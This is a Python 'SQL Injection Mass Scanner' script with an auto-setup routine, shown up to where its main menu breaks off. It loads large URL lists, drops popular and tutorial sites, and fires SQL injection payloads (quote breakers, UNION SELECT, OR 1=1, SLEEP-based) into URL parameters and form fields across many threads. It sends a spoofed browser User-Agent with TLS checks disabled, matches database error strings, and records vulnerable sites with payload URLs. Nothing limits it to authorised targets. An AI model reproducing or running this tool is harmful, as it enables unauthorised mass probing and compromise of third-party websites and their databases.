#!/usr/bin/env python3

from __future__ import print_function
import sys
import os
import subprocess
import time
import platform
import concurrent.futures
import threading
from datetime import datetime
import json
import re
import urllib3
import signal
from urllib.parse import urljoin, urlparse
from collections import defaultdict

# ==============================================
# AUTO SETUP SYSTEM
# ==============================================
def setup_environment():
    """Configura todo automáticamente: venv, dependencias, etc."""
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 32 + "SQLI SCANNER AUTO-SETUP" + " " * 27 + "║")
    print("╚" + "═" * 78 + "╝\n")
    
    # Verificar Python
    print("[1/7] 🔍 Checking Python version...")
    try:
        python_version = sys.version_info
        if python_version.major < 3 or (python_version.major == 3 and python_version.minor < 8):
            print(f"[!] Python {python_version.major}.{python_version.minor} is too old!")
            print("[!] Please install Python 3.8 or higher")
            return False
        print(f"[+] Python {python_version.major}.{python_version.minor}.{python_version.micro} ✓")
    except:
        print("[!] Cannot determine Python version!")
        return False
    
    # Determinar sistema operativo
    is_windows = platform.system() == "Windows"
    print(f"[+] Operating System: {platform.system()} {'(Windows)' if is_windows else ''}")
    
    # Verificar si ya estamos en un venv
    in_venv = hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)
    
    if not in_venv:
        print("\n[2/7] 🏗️  Creating virtual environment...")
        venv_dir = "sqliscanner_env"
        
        if os.path.exists(venv_dir):
            print(f"[+] Virtual environment '{venv_dir}' already exists")
        else:
            try:
                print(f"[~] Creating virtual environment in '{venv_dir}'...")
                subprocess.run([sys.executable, "-m", "venv", venv_dir], check=True, capture_output=True)
                print("[+] Virtual environment created successfully ✓")
            except subprocess.CalledProcessError as e:
                print(f"[!] Failed to create virtual environment: {e}")
                print("[!] Trying alternative method...")
                try:
                    import venv
                    venv.create(venv_dir, with_pip=True)
                    print("[+] Virtual environment created with venv module ✓")
                except Exception as e2:
                    print(f"[!] Failed with venv module: {e2}")
                    print("[?] Continue without virtual environment? (Y/N)")
                    if input("> ").strip().lower() != 'y':
                        return False
        
        # En Windows, necesitamos activar el venv de manera especial
        if is_windows and os.path.exists(venv_dir):
            print("\n[3/7] ⚡ Activating virtual environment...")
            
            # Determinar el path del Python en el venv
            if os.path.exists(os.path.join(venv_dir, "Scripts", "python.exe")):
                venv_python = os.path.join(venv_dir, "Scripts", "python.exe")
            elif os.path.exists(os.path.join(venv_dir, "bin", "python")):
                venv_python = os.path.join(venv_dir, "bin", "python")
            else:
                print("[!] Cannot find Python in virtual environment")
                venv_python = sys.executable
            
            # Usar el Python del venv para el resto del script
            print(f"[+] Using Python from: {venv_python}")
            
            # Verificar si podemos usar este Python
            try:
                result = subprocess.run([venv_python, "--version"], capture_output=True, text=True)
                print(f"[+] Virtual environment Python: {result.stdout.strip()}")
                # Cambiar el ejecutable de Python para las instalaciones
                sys.executable = venv_python
            except:
                print("[!] Cannot use venv Python, using system Python")
    
    else:
        print("\n[+] Already in virtual environment ✓")
    
    # Instalar/actualizar pip
    print("\n[4/7] 📦 Updating pip...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], 
                      check=True, capture_output=True)
        print("[+] pip updated successfully ✓")
    except:
        print("[!] Failed to update pip, continuing anyway...")
    
    # Instalar dependencias
    print("\n[5/7] 📥 Installing dependencies...")
    
    dependencies = [
        "requests",
        "beautifulsoup4",
        "colorama",
        "urllib3",
        "lxml"
    ]
    
    all_installed = True
    for dep in dependencies:
        print(f"[~] Installing {dep}...")
        try:
            # Usar --quiet para menos output
            if is_windows:
                subprocess.run([sys.executable, "-m", "pip", "install", dep, "--quiet"], 
                              check=True, capture_output=True)
            else:
                subprocess.run([sys.executable, "-m", "pip", "install", dep], 
                              check=True, capture_output=True)
            print(f"[+] {dep} installed ✓")
        except subprocess.CalledProcessError:
            print(f"[!] Failed to install {dep}")
            all_installed = False
    
    if not all_installed:
        print("\n[!] Some dependencies failed to install automatically")
        print("[?] Try manual installation with: pip install requests beautifulsoup4 colorama urllib3 lxml")
        print("[?] Continue anyway? (Y/N)")
        if input("> ").strip().lower() != 'y':
            return False
    
    print("\n[6/7] 🔄 Verifying installations...")
    
    # Verificar imports críticos
    critical_modules = ["requests", "bs4", "colorama"]
    missing_modules = []
    
    for module in critical_modules:
        try:
            if module == "bs4":
                __import__("bs4")
            else:
                __import__(module)
            print(f"[+] {module} ✓")
        except ImportError:
            print(f"[!] {module} ✗")
            missing_modules.append(module)
    
    if missing_modules:
        print(f"\n[!] Missing critical modules: {', '.join(missing_modules)}")
        print("[?] Try installing manually or continue anyway? (Y/N)")
        if input("> ").strip().lower() != 'y':
            return False
    
    print("\n[7/7] ✅ Setup completed successfully!")
    print("\n" + "=" * 80)
    print("[+] SQL Injection Scanner is ready!")
    print("[+] Starting main application...")
    print("=" * 80 + "\n")
    
    time.sleep(2)
    return True


# Ejecutar el setup automático
if __name__ == "__main__":
    # Preguntar si ejecutar auto-setup
    print("\n" + "▄" * 80)
    print("█" + " " * 30 + "SQLI SCANNER v3.1 - FIXED" + " " * 26 + "█")
    print("▀" * 80 + "\n")
    
    print("[?] Do you want to run automatic setup? (creates venv, installs dependencies)")
    print("[?] This will take a few minutes. (Y/N)")
    
    try:
        run_setup = input("> ").strip().lower()
        if run_setup == 'y':
            if not setup_environment():
                print("\n[!] Setup failed. Exiting...")
                sys.exit(1)
        else:
            print("\n[!] Skipping automatic setup...")
            print("[!] Make sure you have all dependencies installed manually")
            print("[!] Required: requests beautifulsoup4 colorama urllib3 lxml")
            print("\n[?] Continue without setup? (Y/N)")
            if input("> ").strip().lower() != 'y':
                sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n[!] Setup cancelled by user")
        sys.exit(1)

# ==============================================
# IMPORTAR MÓDULOS DESPUÉS DEL SETUP
# ==============================================
print("[~] Loading modules...")

try:
    import requests
    from bs4 import BeautifulSoup as bs
    print("[+] requests, BeautifulSoup4 loaded ✓")
except ImportError as e:
    print(f"[!] ERROR: {e}")
    print("[!] Install missing modules")
    sys.exit(1)

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init(autoreset=True)
    print("[+] colorama loaded ✓")
    
    # Definir colores personalizados
    class colors:
        CRED2 = Fore.RED
        CBLUE2 = Fore.BLUE
        CGREEN = Fore.GREEN
        CYELLOW = Fore.YELLOW
        CMAGENTA = Fore.MAGENTA
        CCYAN = Fore.CYAN
        CWHITE = Fore.WHITE
        ENDC = Style.RESET_ALL
        BOLD = Style.BRIGHT
        UNDERLINE = '\033[4m'
        
except ImportError:
    print("[!] WARNING: colorama not installed, using basic colors")
    # Definir colores básicos
    class colors:
        CRED2 = '\033[91m'
        CBLUE2 = '\033[94m'
        CGREEN = '\033[92m'
        CYELLOW = '\033[93m'
        CMAGENTA = '\033[95m'
        CCYAN = '\033[96m'
        CWHITE = '\033[97m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
    
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

# Importar módulos adicionales
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    print("[+] urllib3 loaded ✓")
except:
    print("[!] WARNING: urllib3 not available")

# Banner ASCII art
BANNER = r"""
  ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███     
▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒   
░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒   
  ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄     
▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒   
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░   
░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░   
░  ░  ░  ░          ░   ▒      ░   ░ ░    ░   ░ ░    ░     ░░   ░    
      ░  ░ ░            ░  ░         ░          ░    ░  ░   ░        
         ░                                                           

                         AUTHOR: SIGALA
"""

def print_banner():
    """Imprime el banner con efectos"""
    print("\n" + Fore.CYAN + "=" * 90)
    print(Fore.YELLOW + "STARTING SQL INJECTION MASS SCANNER")
    print(Fore.CYAN + "=" * 90 + "\n")
    
    for line in BANNER.split('\n'):
        for col in line:
            print(colors.CRED2 + col, end="")
            sys.stdout.flush()
            time.sleep(0.0001)
        print()

    x = (f"""
                \n""")
    
    for col in x:
        print(colors.CBLUE2 + col, end="")
        sys.stdout.flush()
        time.sleep(0.001)

    y = f"\n\t\t\n"
    for col in y:
        print(colors.CRED2 + col, end="")
        sys.stdout.flush()
        time.sleep(0.02)


# ==============================================
# CLASE PRINCIPAL DEL SCANNER - VERSIÓN CORREGIDA
# ==============================================
class SQLiScanner:
    def __init__(self, max_workers=10, timeout=15):
        """Inicializa el scanner SQL Injection - VERSIÓN CORREGIDA"""
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        self.session.verify = False
        self.timeout = timeout
        self.max_workers = max_workers
        self.vulnerable_urls = []
        self.scanned_count = 0
        self.vuln_count = 0
        self.lock = threading.Lock()
        
        # SQL Error patterns para detección - MÁS ESPECÍFICOS Y MENOS FALSOS POSITIVOS
        self.sql_errors = [
            # MySQL - errores específicos de sintaxis
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"mysql_fetch_",
            r"mysqli_fetch_",
            r"mysql_num_rows",
            r"mysqli_num_rows",
            r"mysql_query\(\)",
            r"mysqli_query\(\)",
            r"mysql_error\(\)",
            r"mysqli_error\(\)",
            
            # SQL Server
            r"unclosed quotation mark",
            r"'quoted string' not properly terminated",
            r"microsoft.*odbc",
            r"odbc.*driver",
            r"incorrect syntax near",
            
            # Oracle
            r"ora-\d{5}",
            r"oracle.*error",
            
            # PostgreSQL
            r"postgresql.*error",
            r"pg_.*error",
            
            # SQLite
            r"sqlite3.*error",
            
            # Errores genéricos pero específicos
            r"syntax error.*sql",
            r"division by zero",
            r"supplied argument is not a valid.*mysql",
            r"call to a member function.*on null",
        ]
        
        # Payloads para pruebas
        self.payloads = {
            "basic": ["'", '"', "')", '\")', "`", "'--", "\"--", "'/*", "\"/*"],
            "union": ["' UNION SELECT null--", '" UNION SELECT null--', "' UNION SELECT null, null--"],
            "error": ["' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "\" OR 1=1#"],
            "time": ["' AND SLEEP(5)--", '" AND SLEEP(5)--', "' AND BENCHMARK(1000000,MD5(1))--"],
        }
        
        # Dominios y extensiones a excluir automáticamente
        self.excluded_domains = [
            'vbook.pub', 'pastebin.com', 'blogspot.com', 'pdfcoffee.com', 'freelancer.mx',
            'tutsql.blogspot.com', 'travelafterfive.com', 'github.com', 'youtube.com',
            'facebook.com', 'twitter.com', 'linkedin.com', 'instagram.com', 'tiktok.com',
            'reddit.com', 'pinterest.com', 'wikipedia.org', 'stackoverflow.com',
            'medium.com', 'quora.com', 'archive.org', 'waybackmachine.org'
        ]
        
        self.excluded_extensions = [
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.exe', '.msi',
            '.mp3', '.mp4', '.avi', '.mkv', '.mov', '.wmv',
            '.css', '.js', '.json', '.xml', '.svg', '.ico'
        ]
    
    def clean_response_text(self, text):
        """Limpia el texto para evitar falsos positivos"""
        if not text:
            return ""
        
        # Convertir a minúsculas
        text = text.lower()
        
        # Remover código HTML/JavaScript común
        text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL)
        text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
        text = re.sub(r'<!--.*?-->', '', text, flags=re.DOTALL)
        text = re.sub(r'<[^>]+>', ' ', text)
        
        # Remover URLs
        text = re.sub(r'https?://\S+', '', text)
        
        # Remover caracteres especiales múltiples
        text = re.sub(r'[^\w\s.,;:!?\-]', ' ', text)
        
        # Remover espacios múltiples
        text = re.sub(r'\s+', ' ', text)
        
        return text.strip()
    
    def is_real_sql_error(self, text, url=""):
        """Verifica si es un error SQL REAL (no falso positivo)"""
        if not text:
            return False, ""
        
        clean_text = self.clean_response_text(text)
        
        # Verificar patrones de error SQL
        for pattern in self.sql_errors:
            if re.search(pattern, clean_text, re.IGNORECASE):
                match = re.search(pattern, clean_text, re.IGNORECASE)
                context_start = max(0, match.start() - 100)
                context_end = min(len(clean_text), match.end() + 100)
                context = clean_text[context_start:context_end]
                
                # Verificar que NO sea un falso positivo
                # 1. No debe contener palabras indicativas de tutorial/blog
                false_indicators = [
                    'tutorial', 'example', 'blog', 'article', 'post', 'lesson',
                    'guide', 'how to', 'learn', 'teaching', 'training', 'course',
                    'documentation', 'manual', 'reference', 'example code',
                    'sample', 'demo', 'test', 'practice', 'exercise'
                ]
                
                if any(indicator in context for indicator in false_indicators):
                    return False, ""
                
                # 2. Debe contener indicadores de error real
                error_indicators = [
                    'error', 'warning', 'exception', 'failed', 'invalid',
                    'unexpected', 'syntax', 'parse', 'fatal', 'critical'
                ]
                
                if any(indicator in context for indicator in error_indicators):
                    # 3. El contexto debe ser razonablemente corto (errores son breves)
                    if len(context) < 500:
                        return True, pattern
        
        return False, ""
    
    def is_vulnerable(self, response, original_url=""):
        """Verifica si la respuesta contiene errores SQL REALES"""
        if not response or not response.text:
            return False
        
        # Verificar si es un error SQL real
        is_vuln, pattern = self.is_real_sql_error(response.text, original_url)
        
        if is_vuln:
            # Verificación adicional: comparar con respuesta sin payload
            try:
                # Obtener URL base sin parámetros
                if "?" in original_url:
                    base_url = original_url.split("?")[0]
                    # Hacer petición sin payload
                    clean_response = self.session.get(
                        base_url,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                    
                    # Verificar si la respuesta limpia también tiene el error
                    clean_is_vuln, _ = self.is_real_sql_error(clean_response.text)
                    if clean_is_vuln:
                        # Si la página limpia también tiene error, es falso positivo
                        return False
            except:
                pass
            
            return True
        
        return False
    
    def get_all_forms(self, url):
        """Obtiene todos los formularios de una página"""
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            # Verificar que sea HTML
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' not in content_type:
                return []
            
            soup = bs(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception:
            return []
    
    def get_form_details(self, form):
        """Extrae detalles de un formulario"""
        details = {
            'action': form.get('action', ''),
            'method': form.get('method', 'get').lower(),
            'inputs': []
        }
        
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_type = input_tag.get('type', 'text')
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            
            if input_name:
                details['inputs'].append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                })
        
        return details
    
    def is_scannable_url(self, url):
        """Determina si una URL es escaneable"""
        if not url:
            return False
        
        # Verificar que sea una URL HTTP/HTTPS válida
        if not url.startswith(('http://', 'https://')):
            return False
        
        # Excluir dominios no escaneables
        for domain in self.excluded_domains:
            if domain in url.lower():
                return False
        
        # Excluir extensiones de archivo
        for ext in self.excluded_extensions:
            if url.lower().endswith(ext):
                return False
        
        # Verificar que no sea una URL de documento/blog obvia
        url_lower = url.lower()
        document_indicators = ['/documents/', '/document/', '/pdf/', '/doc/', 
                              '/download/', '/file/', '/archive/', '/blog/',
                              '/article/', '/post/', '/page/', '/tag/',
                              '/category/', '/author/', '/date/']
        
        if any(indicator in url_lower for indicator in document_indicators):
            return False
        
        return True
    
    def test_url_parameters(self, url):
        """Prueba inyección SQL en parámetros URL"""
        vulnerabilities = []
        parsed_url = urlparse(url)
        
        # Solo probar si tiene parámetros
        if not parsed_url.query:
            return vulnerabilities
        
        # Extraer parámetros
        params = parsed_url.query.split('&')
        param_names = []
        
        for param in params:
            if '=' in param:
                param_name = param.split('=')[0]
                if param_name not in param_names:
                    param_names.append(param_name)
        
        # Probar cada parámetro único
        for param_name in param_names:
            # Construir URL de prueba con payload
            test_params = []
            for param in params:
                if param.startswith(param_name + '='):
                    # Añadir payload a este parámetro
                    param_value = param.split('=', 1)[1] if '=' in param else ''
                    for payload in self.payloads['basic'][:3]:  # Solo 3 payloads básicos
                        test_param = f"{param_name}={param_value}{payload}"
                        test_params.append(test_param)
                else:
                    test_params.append(param)
            
            test_query = '&'.join(test_params)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
            
            try:
                response = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                if response.status_code == 200 and self.is_vulnerable(response, url):
                    vulnerabilities.append(("URL_PARAM", test_url, f"SQLi in parameter: {param_name}"))
                    break  # Una vulnerabilidad por URL es suficiente
            except:
                continue
        
        return vulnerabilities
    
    def test_form_injection(self, url, form):
        """Prueba inyección SQL en formularios"""
        vulnerabilities = []
        form_details = self.get_form_details(form)
        
        if not form_details['inputs']:
            return vulnerabilities
        
        # Construir URL objetivo
        target_url = urljoin(url, form_details['action']) if form_details['action'] else url
        
        # Solo probar si tiene campos de texto
        text_fields = [f for f in form_details['inputs'] if f['type'] in ['text', 'email', 'password', 'search', None]]
        if not text_fields:
            return vulnerabilities
        
        # Probar payloads básicos
        for payload in self.payloads['basic'][:2]:  # Solo 2 payloads para formularios
            data = {}
            
            for input_field in form_details['inputs']:
                if input_field['type'] in ['hidden', 'submit', 'button', 'checkbox', 'radio', 'file']:
                    data[input_field['name']] = input_field['value']
                elif input_field['type'] in ['text', 'email', 'password', 'search', None]:
                    data[input_field['name']] = payload
            
            try:
                if form_details['method'] == 'post':
                    response = self.session.post(target_url, data=data, timeout=self.timeout, allow_redirects=True)
                else:
                    response = self.session.get(target_url, params=data, timeout=self.timeout, allow_redirects=True)
                
                if response.status_code == 200 and self.is_vulnerable(response, url):
                    vulnerabilities.append(("FORM", target_url, "SQLi in form"))
                    break
            except:
                continue
        
        return vulnerabilities
    
    def scan_single_url(self, url):
        """Escanea una URL individual"""
        vulnerabilities = []
        
        try:
            # Primero verificar si la página existe
            head_response = self.session.head(url, timeout=5, allow_redirects=True)
            if head_response.status_code != 200:
                return url, vulnerabilities
            
            # Obtener la página completa
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            if response.status_code != 200:
                return url, vulnerabilities
            
            # Verificar content-type
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' not in content_type:
                return url, vulnerabilities
            
            # Prueba 1: Parámetros URL
            url_vulns = self.test_url_parameters(url)
            vulnerabilities.extend(url_vulns)
            
            # Prueba 2: Formularios (solo si no encontramos vulnerabilidad en URL)
            if not vulnerabilities:
                forms = self.get_all_forms(url)
                for form in forms:
                    form_vulns = self.test_form_injection(url, form)
                    vulnerabilities.extend(form_vulns)
        
        except Exception as e:
            # Ignorar errores de conexión/timeout
            pass
        
        return url, vulnerabilities
    
    def filter_urls_file(self, input_file, output_file=None):
        """Filtra un archivo de URLs, removiendo las no escaneables"""
        if not os.path.exists(input_file):
            print(f"{Fore.RED}[✗] File not found: {input_file}")
            return None
        
        if output_file is None:
            output_file = f"filtered_{os.path.basename(input_file)}"
        
        try:
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                all_urls = [line.strip() for line in f if line.strip()]
        except:
            print(f"{Fore.RED}[✗] Error reading file: {input_file}")
            return None
        
        filtered_urls = []
        skipped_urls = []
        
        print(f"{Fore.CYAN}[~] Filtering URLs from: {input_file}")
        print(f"{Fore.CYAN}[~] Total URLs found: {len(all_urls)}")
        
        for i, url in enumerate(all_urls):
            if self.is_scannable_url(url):
                filtered_urls.append(url)
            else:
                skipped_urls.append(url)
            
            # Mostrar progreso cada 1000 URLs
            if (i + 1) % 1000 == 0:
                sys.stdout.write(f"\r{Fore.CYAN}[~] Processed: {i + 1}/{len(all_urls)} | "
                               f"Filtered: {len(filtered_urls)} | Skipped: {len(skipped_urls)}")
                sys.stdout.flush()
        
        # Guardar URLs filtradas
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(filtered_urls))
        
        print(f"\n{Fore.GREEN}[+] Filtering completed!")
        print(f"{Fore.GREEN}[+] Filtered URLs saved to: {output_file}")
        print(f"{Fore.YELLOW}[+] Statistics:")
        print(f"    {Fore.CYAN}• Total URLs: {len(all_urls)}")
        print(f"    {Fore.GREEN}• Scannable URLs: {len(filtered_urls)}")
        print(f"    {Fore.YELLOW}• Skipped URLs: {len(skipped_urls)}")
        
        # Mostrar ejemplos de URLs filtradas
        if filtered_urls:
            print(f"\n{Fore.CYAN}[~] Sample of filtered URLs:")
            for i, sample_url in enumerate(filtered_urls[:5]):
                print(f"    {i+1}. {sample_url}")
            if len(filtered_urls) > 5:
                print(f"    ... and {len(filtered_urls)-5} more")
        
        return output_file
    
    def scan_from_file(self, filename, output_file=None, resume=False, filter_first=True):
        """Escanea múltiples URLs desde archivo"""
        # Si se solicita filtrado primero
        if filter_first:
            filtered_file = self.filter_urls_file(filename)
            if not filtered_file:
                return
            filename = filtered_file
        
        # Cargar URLs
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                urls = [line.strip() for line in f if line.strip()]
        except:
            print(f"{Fore.RED}[✗] Error reading file: {filename}")
            return
        
        if not urls:
            print(f"{Fore.YELLOW}[!] No URLs to scan")
            return
        
        total_urls = len(urls)
        print(f"{Fore.GREEN}[+] Loaded {total_urls} URLs from {filename}")
        
        # Configurar archivo de salida
        if output_file is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"sqli_scan_results_{timestamp}.txt"
        
        # Escribir cabecera del archivo de resultados
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("SQL INJECTION SCAN RESULTS\n")
            f.write(f"Scan date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Source file: {filename}\n")
            f.write(f"Total URLs scanned: {total_urls}\n")
            f.write("=" * 80 + "\n\n")
        
        # Archivo para tracking
        scanned_file = f"{output_file}.scanned"
        
        # Si es resume, cargar URLs ya escaneadas
        if resume and os.path.exists(scanned_file):
            with open(scanned_file, 'r') as sf:
                scanned_urls = set(line.strip() for line in sf)
            urls = [url for url in urls if url not in scanned_urls]
            print(f"{Fore.CYAN}[↻] Resuming scan, {len(urls)} URLs remaining")
        
        # Mostrar configuración
        print(f"{Fore.CYAN}[~] Starting scan with {self.max_workers} workers")
        print(f"{Fore.CYAN}[~] Timeout per request: {self.timeout}s")
        print(f"{Fore.CYAN}[~] Results file: {output_file}")
        print("-" * 90)
        
        # Iniciar escaneo
        start_time = time.time()
        self.vulnerable_urls = []
        self.scanned_count = 0
        self.vuln_count = 0
        
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                # Enviar URLs al executor
                future_to_url = {executor.submit(self.scan_single_url, url): url for url in urls}
                
                for future in concurrent.futures.as_completed(future_to_url):
                    url = future_to_url[future]
                    
                    try:
                        scanned_url, vulnerabilities = future.result()
                        
                        with self.lock:
                            # Guardar URL escaneada
                            with open(scanned_file, 'a') as sf:
                                sf.write(f"{scanned_url}\n")
                            
                            self.scanned_count += 1
                            
                            # Mostrar progreso
                            progress = (self.scanned_count / total_urls) * 100
                            sys.stdout.write(
                                f"\r{Fore.CYAN}[~] Progress: {self.scanned_count}/{total_urls} "
                                f"({progress:.1f}%) | Vulnerable: {self.vuln_count} "
                                f"| Time: {time.time() - start_time:.1f}s"
                            )
                            sys.stdout.flush()
                            
                            # Procesar vulnerabilidades
                            if vulnerabilities:
                                self.vuln_count += 1
                                self.vulnerable_urls.append((scanned_url, vulnerabilities))
                                
                                print(f"\n{Fore.RED}[!] VULNERABLE: {scanned_url}")
                                
                                # Guardar en archivo
                                with open(output_file, 'a', encoding='utf-8') as f:
                                    f.write(f"\n{'='*60}\n")
                                    f.write(f"[!] VULNERABLE: {scanned_url}\n")
                                    for vuln_type, vuln_url, vuln_desc in vulnerabilities:
                                        f.write(f"  - Type: {vuln_type}\n")
                                        f.write(f"    Description: {vuln_desc}\n")
                                        if vuln_type == "URL_PARAM":
                                            f.write(f"    Payload: {vuln_url}\n")
                                    
                                    f.write(f"{'='*60}\n")
                                
                                # Mostrar en consola
                                for vuln_type, vuln_url, vuln_desc in vulnerabilities:
                                    print(f"{Fore.YELLOW}    [+] {vuln_type}: {vuln_desc}")
                                    if vuln_type == "URL_PARAM":
                                        print(f"{Fore.CYAN}        Payload: {vuln_url}")
                    
                    except Exception as e:
                        with self.lock:
                            self.scanned_count += 1
                            # Solo mostrar errores importantes
                            if "No such file or directory" not in str(e):
                                print(f"\n{Fore.RED}[✗] Error: {url[:50]}... - {str(e)[:50]}")
        
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user")
            print(f"{Fore.CYAN}[~] Partial results saved to: {output_file}")
        
        finally:
            # Mostrar resumen
            elapsed_time = time.time() - start_time
            self.show_summary(total_urls, elapsed_time, output_file)
            
            # Limpiar archivo temporal
            if os.path.exists(scanned_file):
                os.remove(scanned_file)
    
    def show_summary(self, total_urls, elapsed_time, output_file):
        """Muestra resumen del escaneo"""
        print(f"\n\n{Fore.CYAN}{'='*90}")
        print(f"{Fore.YELLOW}            SCAN COMPLETED - SUMMARY")
        print(f"{Fore.CYAN}{'='*90}")
        
        print(f"{Fore.GREEN}[+] Total URLs scanned: {total_urls}")
        print(f"{Fore.GREEN}[+] Vulnerable URLs found: {self.vuln_count}")
        
        if total_urls > 0:
            vulnerable_percent = (self.vuln_count / total_urls) * 100
            print(f"{Fore.CYAN}[+] Vulnerability rate: {vulnerable_percent:.2f}%")
        
        print(f"{Fore.GREEN}[+] Scan duration: {elapsed_time:.2f} seconds")
        
        if elapsed_time > 0:
            urls_per_second = total_urls / elapsed_time
            print(f"{Fore.GREEN}[+] Speed: {urls_per_second:.2f} URLs/second")
        
        if self.vuln_count > 0:
            print(f"\n{Fore.YELLOW}[!] VULNERABLE URLs FOUND:")
            print(f"{Fore.CYAN}{'-'*90}")
            
            for i, (url, vulnerabilities) in enumerate(self.vulnerable_urls, 1):
                print(f"\n{Fore.RED}{i}. {url}")
                for vuln_type, vuln_url, vuln_desc in vulnerabilities:
                    print(f"{Fore.YELLOW}   • {vuln_desc}")
        else:
            print(f"\n{Fore.GREEN}[✓] No SQL Injection vulnerabilities found!")
            print(f"{Fore.CYAN}[~] All scanned URLs appear to be secure")
        
        print(f"\n{Fore.GREEN}[+] Detailed results saved to: {output_file}")
        
        # Generar reporte JSON si hay vulnerabilidades
        if self.vuln_count > 0:
            json_file = output_file.replace('.txt', '.json')
            self.generate_json_report(json_file)
            print(f"{Fore.GREEN}[+] JSON report saved to: {json_file}")
        
        print(f"{Fore.CYAN}{'='*90}\n")
    
    def generate_json_report(self, json_file):
        """Genera reporte en formato JSON"""
        report = {
            "scan_info": {
                "date": datetime.now().isoformat(),
                "total_urls": self.scanned_count,
                "vulnerable_urls": self.vuln_count,
                "scan_duration_seconds": time.time() - getattr(self, 'scan_start_time', 0)
            },
            "vulnerabilities": []
        }
        
        for url, vulns in self.vulnerable_urls:
            vuln_entry = {
                "url": url,
                "vulnerabilities": []
            }
            
            for vuln_type, vuln_url, vuln_desc in vulns:
                vuln_entry["vulnerabilities"].append({
                    "type": vuln_type,
                    "description": vuln_desc,
                    "payload_url": vuln_url if vuln_type == "URL_PARAM" else None
                })
            
            report["vulnerabilities"].append(vuln_entry)
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)


# ==============================================
# INTERFAZ DE USUARIO
# ==============================================
def safe_input(prompt, is_int=False, default=None, min_val=None, max_val=None):
    """Entrada segura con validación"""
    while True:
        try:
            value = input(prompt).strip()
            
            if not value and default is not None:
                return default
            
            if is_int:
                value = int(value)
                if min_val is not None and value < min_val:
                    print(f"{Fore.RED}[!] Value must be at least {min_val}")
                    continue
                if max_val is not None and value > max_val:
                    print(f"{Fore.RED}[!] Value must be at most {max_val}")
                    continue
            return value
        except ValueError:
            if is_int:
                print(f"{Fore.RED}[!] Please enter a valid number")
            continue
        except KeyboardInterrupt:
            raise KeyboardInterrupt


def show_menu():
    """Muestra el menú principal"""
    print_banner()
    
    print(f"\n{Fore.CYAN}{'='*90}")
    print(f"{Fore.YELLOW}                    MAIN MENU")
    print(f"{Fore.CYAN}{'='*90}")
    
    print(f"\n{Fore.GREEN}[1]{Fore.WHITE} Scan Single URL")
    print(f"{Fore.GREEN}[2]{Fore.WHITE} Scan URLs from File (MASSIVE MODE)")
    print(f"{Fore.GREEN}[3]{Fore.WHITE} Filter URLs File (Remove non-scannable URLs)")
